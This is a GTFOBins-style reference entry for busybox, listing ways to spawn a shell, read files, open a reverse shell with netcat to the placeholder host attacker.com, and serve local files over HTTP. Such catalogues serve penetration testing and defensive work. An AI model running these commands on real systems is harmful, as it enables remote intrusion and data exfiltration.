---
type: gtfobin
name: busybox
platform: Unix
functions: [inherit, reverse-shell, upload]
tags: [gtfobin, unix, lotl]
---

# busybox

## inherit

```bash
busybox ash
```
**Contexts:** sudo, unprivileged

```bash
busybox cat
```
**Contexts:** sudo, unprivileged

## reverse-shell

```bash
busybox nc -e /bin/sh attacker.com 12345
```
**Contexts:** sudo, unprivileged

## upload

```bash
busybox httpd -f -p 12345 -h .
```
_This serves files in the local folder via an HTTP server._
**Contexts:** sudo, unprivileged
